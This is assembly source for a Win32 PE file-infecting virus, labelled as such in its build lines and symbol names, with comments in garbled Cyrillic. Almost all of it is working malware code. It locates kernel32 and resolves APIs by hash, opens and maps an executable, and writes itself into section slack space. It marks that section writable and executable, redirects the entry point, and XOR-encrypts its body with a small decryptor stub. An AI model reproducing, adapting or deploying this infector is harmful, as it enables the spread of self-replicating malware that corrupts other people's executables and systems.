; tasm32 /ml /m3 virus,,
; tlink32 /Tpe /aa /c /v virus,virus,,import32.lib,

.386p                                   ; ��������� 386+
.model  flat                            ; 32-� ������ �������� ���
                                        ; ���������
extrn    MessageBoxA:PROC
extrn    ExitProcess:PROC

crypt_size  equ     (offset modificator_end - offset modificator_start)
virus_size  equ     (offset virus_end - offset virus_start)
real_size   equ     (offset virus_end - offset virus_start + crypt_size)
shit_size   equ     (offset delta - offset start)

.data
szTitle     db      "[NOP-�����]",0
szMessage   db      "������ ��������� ������!",10
            db      "��������� �����: C:\TEST.EXE",0
.code
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ����� ���� ������, ������������ ��p���� ;)                               ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
virus_start label   byte
start:
    call    delta
delta:
    pop     ebp
    sub     ebp,offset delta

;    xor     eax,eax
;    mov     ecx,size_buffer
;@@add: push    eax
;    loop    @@add

    call    GetAPIs                         ; �������� ��� API-�������
    call    Infect

    test    ebp,ebp
    jz      fakehost

    push    00401000h
EIP equ     $-4
    ret

modificator_start   label   byte
mark:
    nop
    pushad
    pushfd

    mov     edi,00400000h
code_base   equ $-4
    mov     esi,[edi+3Ch]
    add     esi,edi

    mov     edi,esi                         ; ESI = EDI = PE Header
    movzx   ecx,word ptr [edi+06h]          ; CX = ���������� ������
    add     esi,78h                         ; �������� �� ������� ��p-�
    mov     edx,[edi+74h]                   ; EDX = ���������� ��-���
    shl     edx,3                           ; EDX = EDX*8 (2^3=8)
    add     esi,edx

__nextsec:
    dec     ecx
    js      UnMapFile
    add     esi,28h                         ; ESI = ��������� ��
                                            ; ��������� ������
;    RawSize-VirtualSize = ������ ��� �����!
    mov     eax,[esi+08h]                   ; EAX = VirtualSize
    mov     edx,[esi+10h]                   ; EDX = SizeOfRawData
    add     eax,virus_size                  ; EAX = EAX+virus_size
    cmp     eax,edx
    jg      __nextsec


    add     edi,[esi+28h]
    add     edi,crypt_size
    mov     esi,(virus_size/4)
 @@1:
    xor     dword ptr [edi+esi*4],edi
    dec     esi
    jns     @@1
modificator_end     label   byte

Infect:
    push    dword ptr [ebp+EIP]
    call    Infection                       ; �������� ����
    pop     dword ptr [ebp+EIP]

    ret

Infection:
    lea     esi,[ebp+szFileName]            ; �������� ��� ��p��������
                                            ; �����
    push    esi
    call    [ebp+_GetFileAttributesA]       ; ������ ��� ��������
    mov     dword ptr [ebp+dwFileAttributes],eax    ; ��������� ��

    push    80h                             ; FILE_ATTRIBUTE_NORMAL
    push    esi
    call    [ebp+_SetFileAttributesA]       ; ���p��� ��� ���p�����

    call    OpenFile                        ; ���p����� ���

    inc     eax                             ; ���� EAX = -1, �p�������
    jz      CantOpen                        ; ������
    dec     eax

    mov     dword ptr [ebp+FileHandle],eax  ; ��������� Handle �����

    xor     edx,edx                         ; EDX = 0
    push    edx
    push    eax
    call    [ebp+_GetFileSize]              ; ������ ������ �����

    mov     dword ptr [ebp+nFileSize],eax   ; � ��������� ���

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ��p���, ��� �� ������, ��� ���p��� ���p����� ����� � ������������� ��    ;
 ; p������ ������p����. ��� �������������� � ������� �������                ;
 ; SetFileAttributes. ��� �p����� ���������� ������ �������:                ;
 ;                                                                          ;
 ; ������� SetFileAttributes ������������� ���p����� �����.                 ;
 ;                                                                          ;
 ; BOOL SetFileAttributes(                                                  ;
 ;   LPCTSTR lpFileName, // ��p�� ����� �����                               ;
 ;   DWORD dwFileAttributes      // ��p�� ��������������� ���p������        ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; ��p����p�                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; � lpFileName: ��������� �� ��p���, �������� ��� �����, ��� ���p�����     ;
 ;   ���������������.                                                       ;
 ;                                                                          ;
 ; � dwFileAttributes: ������ ���p����� �����, ����p�� ������ ����          ;
 ;   �����������. ���� ��p����p ����� ���� ����������� ��������, ����p��    ;
 ;   ����� ����� � ��������������� ������������ �����. ��� �� �� �� ����,   ;
 ;   ������p���� ��������� �������� FILE_ATTRIBUTE_NORMAL.                  ;
 ;                                                                          ;
 ; ����p������� ��������                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; � ���� ����� ������� �p���� �������, ����p������� �������� �� p����      ;
 ;   ����.                                                                  ;
 ;                                                                          ;
 ; � ���� ����� ������� �� ������, ����p������� �������� p���� ����. �����  ;
 ;   �������� �������������� ����p����� �� ������, �������� GetLastError.   ;
 ;                                                                          ;
 ; ����� ��������� ����� ���p������ �� ���p����� ���� �, ���� �� �p�������  ;
 ; ������, ����� ����� ���p������� � �������������� ��p�������.             ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

    mov     ecx,dword ptr [ebp+nFileSize]   ; ��-��p���, ��
    call    CreateMap                       ; �������� �����p����� ����

    or      eax,eax
    jz      CloseFile

    mov     dword ptr [ebp+MapHandle],eax

    mov     ecx,dword ptr [ebp+nFileSize]
    call    MapFile                         ; �����p��� ���

    or      eax,eax
    jz      UnMapFile

    mov     dword ptr [ebp+MapAddress],eax

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ������� �� �������� � ECX p����p �����, ����p�� ����p����� �����p�����,  ;
 ; ����� ���� �������� ������� ��������. �� �p���p��� �� ��������� ������,  ;
 ; � ���� ������� �� �p�������, �� �p��������. � �p������� ������ ��        ;
 ; ���p����� ����. �� ���p����� ����� �������� � ��������� � ����p������    ;
 ; �p�����p� �����p������ ����� � ������� ������� MapFile. ��� � p�����, �� ;
 ; �� �p���p���, �� �p������� �� ������ � ��������� � ������������ �        ;
 ; ���������� p����������. ���� ��� �p���� ��p���, �� ���p����� ����������  ;
 ; � p��������� �������� ��p��.                                             ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

    mov     edi,[eax+3Ch]                   ; �������� �� ������ �����
    add     edi,eax                         ; EDI = ��������� �� PE ���������
    cmp     dword ptr [edi],"EP"            ; ��� PE?
    jnz     UnMapFile                       ; ���� ��, �����������

    mov     eax,[edi+28h]                   ; �������� EIP
    mov     edx,[edi+34h]                   ; �������� ���� ��p���
    mov     dword ptr [ebp+code_base],edx   ; ���p����� ��
    add     eax,edx
    mov     dword ptr [ebp+EIP],eax         ; ���p����� EIP

    mov     eax,[eax]
    cmp     eax,dword ptr [ebp+mark]        ; ��p���� �� �� ���?
    jz      UnMapFile                       ; ���� ��, �����������

    mov     esi,edi                         ; ESI = EDI
    movzx   ecx,word ptr [edi+06h]          ; CX = ���������� ������
    mov     eax,ecx                         ; AX = CX
    imul    eax,eax,28h                     ; EAX = AX*28
    add     esi,eax                         ; ��p��������
    add     esi,78h                         ; �������� �� ������� ��p-�
    mov     edx,[edi+74h]                   ; EDX = ���������� ��-���
    shl     edx,3                           ; EDX = EDX*8 (2^3=8)
    add     esi,edx

__nextsec:
    dec     ecx
    js      UnMapFile
    sub     esi,28h                         ; ESI = ��������� ��
                                            ; ��������� ������
;    RawSize-VirtualSize = ������ ��� �����!
    mov     eax,[esi+08h]                   ; EAX = VirtualSize
    mov     edx,[esi+10h]                   ; EDX = SizeOfRawData
    add     eax,virus_size                  ; EAX = EAX+virus_size
    cmp     eax,edx
    jg      __nextsec

    mov     edx,[esi+08h]                   ; EDX = VirtualSize
    mov     eax,edx                         ; EAX = EDX
    add     edx,[esi+14h]                   ; EDX = EDX+PointerToRawData
                                            ; ������ EDX ��������� �� 
                                            ; ������ ������ � �����

    add     eax,[esi+0Ch]                   ; EAX = EAX+VA ��p��
                                            ; EAX = ����� EIP
    mov     [edi+28h],eax                   ; �������� EIP

    add     eax,[edi+34h]                   ; EAX = EIP+ModBase

    or      dword ptr [esi+24h],0A0000020h  ; �������� ����� ����� ������

    lea     esi,[ebp+modificator_start]     ; ESI = ��������� ��
                                            ; modificator_start
    mov     edi,edx                         ; EDI = Raw ptr after last
                                            ;       section
    add     edi,dword ptr [ebp+MapAddress]  ; EDI = H�p������p������� ��.
    mov     ecx,crypt_size                  ; ECX = �����p ����p�����
                                            ; ������
    rep     movsb                           ; ������ ���!

    lea     esi,[ebp+virus_start]           ; ESI = ��������� ��
                                            ; virus_start
    mov     edi,edx                         ; EDI = Raw ptr after last
                                            ;       section
    add     edi,crypt_size
    add     edi,dword ptr [ebp+MapAddress]  ; EDI = H�p������p������� ��.
    mov     ecx,virus_size                  ; ECX = �����p ����p����� ������
    rep     movsb                           ; ������ ���!

    add     eax,crypt_size
    mov     esi,(virus_size/4)
    mov     edi,edx                         ; EDI = Raw ptr after last section
    add     edi,crypt_size
    add     edi,dword ptr [ebp+MapAddress]  ; EDI = H�p������p������� ��.
 @@2:
    xor   dword ptr [edi+esi*4],eax
    dec     esi
    jns     @@2

    jmp     UnMapFile                       ; ��������, ���p�����, � �.�.

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

UnMapFile:
    push    dword ptr [ebp+MapAddress]      ; ���p����� ��p�� ��������
    call    [ebp+_UnmapViewOfFile]

CloseMap:
    push    dword ptr [ebp+MapHandle]       ; ���p����� �������
    call    [ebp+_CloseHandle]

CloseFile:
    push    dword ptr [ebp+FileHandle]      ; ���p����� ����
    call    [ebp+_CloseHandle]

CantOpen:
    push    dword ptr [ebp+dwFileAttributes]
    lea     eax,[ebp+szFileName]            ; ������������� ���p��
                                            ; ���p����� �����
    push eax
    call    [ebp+_SetFileAttributesA]
    ret

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

 ; input:
 ;      EBP - delta offset
 ;      + HeshAPI � TableAPI
 ; output:
 ;      ����������� TableAPI

GetAPIs         proc
_ReadSEH:
    xor     edx,edx
    mov     eax,fs:[edx]
    dec     edx

_SearchK32:
    cmp     [eax],edx
    je      _CheckK32
    mov     eax,dword [eax]
    jmp     _SearchK32

_CheckK32:
    mov     eax,[eax+4]
    xor     ax,ax

_SearchMZ:
    cmp     word ptr [eax],5A4Dh
    je      _CheckPE
    sub     eax,10000h
    jmp     _SearchMZ

_CheckPE:
    mov     edx,[eax+3ch]
    cmp     word ptr [eax+edx],4550h
    jne     _Exit

_SearchAPI: 
    push    esp                   ; ��������� ������������ esp
    mov     esi,[eax+edx+78h]     ;Export Table RVA
    add     esi,eax               ;Export Table VA
    add     esi,18h
    xchg    eax,ebx               ;EBX = Kernel32 base
    lodsd                         ;Number Of Names
    push    eax
    lodsd                         ;Address Of Functions
    push    eax
    lodsd                         ;Address Of Names 
    push    eax 
    add     eax,ebx
    push    eax                   ;Index - ��������� �� 1-�� ��� �-��
    lodsd                         ;Address Of Name Ordinals 
    push    eax
    lea     edi,[ebp+HeshTable]

_BeginSearch:
    mov     ecx,[esp+4*4]         ;Number Of Names
    xor     edx,edx

_SearchAPIName:          
    mov     esi,[esp+4*1]         ;Index                                                     
    mov     esi,[esi]
    add     esi,ebx               ;ESI = ��� �������

_GetHash:
    xor     eax,eax
    push    eax
_CalcHash:
    ror     eax,7
    xor     [esp],eax
    lodsb
    test    al,al
    jnz     _CalcHash
    pop     eax

_OkHash:
    cmp     eax,dword ptr [edi]
    je      _OkAPI
    add     dword ptr [esp+4*1],4   ;I=I+4 (I--Index)
    inc     edx
    loop    _SearchAPIName 
    jmp     _Exit                   ; ������� ������� �� ������� :(

_OkAPI:
    shl     edx,1
    mov     ecx,[esp]               ;OrdinalTableRVA
    add     ecx,ebx
    add     ecx,edx
    mov     ecx,[ecx]
    and     ecx,0FFFFh
    mov     edx,[esp+4*3]           ;AddressTableRVA
    add     edx,ebx
    shl     ecx,2
    add     edx,ecx
    mov     edx,[edx]
    add     edx,ebx
;    push    edx

    lea     eax,[ebp+HeshTable]
    sub     eax,edi
    mov     esi,[esp+4*5]
    lea     esi,[ebp+APITable]
    sub     esi,eax
    mov     dword ptr [esi],edx

    cmp     word ptr [edi+4],0FFFFh ;0FFFFh-End of HeshTable
    je      _Exit
    add     edi,4

_NextName:          
    mov     ecx,[esp+4*2]           ;NamePointersRVA
    add     ecx,ebx
    mov     [esp+4*1],ecx           ;Index
    jmp     short _BeginSearch

_Exit:
    mov     esp,[esp+4*5]
    ret

GetAPIs         endp

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

 ; input:
 ;      ESI - ��������� �� ��� �����, ����p�� ����� ���p���
 ; output:
 ;      EAX - ����� ����� � ������ ������

OpenFile        proc
    xor     eax,eax
    push    eax
    push    eax
    push    00000003h
    push    eax
    inc     eax
    push    eax
    push    80000000h or 40000000h
    push    esi
    call    [ebp+_CreateFileA]
    ret
OpenFile        endp

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

 ; input:
 ;      ECX - p����p ��������
 ; output:
 ;      EAX - ����� ��������, ���� ����� �p���� �������

CreateMap       proc
    xor     eax,eax
    push    eax
    push    ecx
    push    eax
    push    00000004h
    push    eax
    push    dword ptr [ebp+FileHandle]
    call    [ebp+_CreateFileMappingA]
    ret
CreateMap       endp

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

 ; input:
 ;      ECX - �����p
 ; output:
 ;      EAX - ��p�� � ������ ������

MapFile         proc
    xor     eax,eax
    push    ecx
    push    eax
    push    eax
    push    00000002h
    push    dword ptr [ebp+MapHandle]
    call    [ebp+_MapViewOfFile]
    ret
MapFile         endp

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

APITable:
    _CreateFileA        dd ?
    _GetFileSize        dd ?
    _GetFileAttributesA dd ?
    _SetFilePointer     dd ?
    _SetFileAttributesA dd ?
    _CloseHandle        dd ?
    _CreateFileMappingA dd ?
    _MapViewOfFile      dd ?
    _UnmapViewOfFile    dd ?
    _SetEndOfFile       dd ?
    _VirtualProtect     dd ?

HeshTable:                                  ;������� ����� �������
    CreateFileA_        dd 0860B38BCh
    GetFileSize_        dd 0AAC2523Eh
    GetFileAttributesA_ dd 03D7D6496h
    SetFilePointer_     dd 07F3545C6h
    SetFileAttributesA_ dd 0152DC5D4h
    CloseHandle_        dd 0F867A91Eh
    CreateFileMappingA_ dd 01F394C74h
    MapViewOfFile_      dd 0FC6FB9EAh
    UnmapViewOfFile_    dd 0CA036058h
    SetEndOfFile_       dd 0059C5E24h
    VirtualProtect      dd 015F8EF80h
                        dw 0FFFFh           ;End of HeshTable

    FileHandle          dd ?
    MapHandle           dd ?
    MapAddress          dd ?
    dwFileAttributes    dd ?
    nFileSize           dd ?
    szFileName          db "C:\TEST.EXE",0

virus_end               label   byte

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; H������� ��p���� ���������                                               ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

virsus:
    jmp start

fakehost:
    xor     eax,eax                         ; ����p����� MessageBox �
    push    eax                             ; ������ ����������
    push    offset szTitle
    push    offset szMessage
    push    eax
    call    MessageBoxA

    push    00h                             ; ����p���� p����� ��������
    call    ExitProcess

end     virsus
